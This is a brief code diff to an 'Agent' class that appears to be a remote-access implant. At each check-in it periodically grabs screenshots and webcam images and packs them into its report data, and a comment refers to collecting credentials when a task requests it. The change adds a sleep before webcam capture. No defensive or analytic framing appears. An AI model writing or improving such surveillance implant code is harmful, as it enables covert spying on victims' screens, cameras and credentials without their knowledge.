@@ -2675,14 +2675,16 @@ class Agent:
         # Credentials will now be collected only when explicitly requested via tasks
         
         if self.config.TAKE_SCREENSHOTS:
-            
+
             if self._checkin_count % self.config.SCREENSHOT_FREQUENCY == 0:
                 screenshot = SystemUtils.take_screenshot()
                 if screenshot:
                     data["screenshot"] = screenshot
 
+        # Small delay to ensure screenshot is processed before webcam
         if self.config.TAKE_WEBCAM:
-            
+            time.sleep(2)
+
             if self._checkin_count % self.config.WEBCAM_FREQUENCY == 0:
                 webcam = SystemUtils.capture_webcam()
                 if webcam:
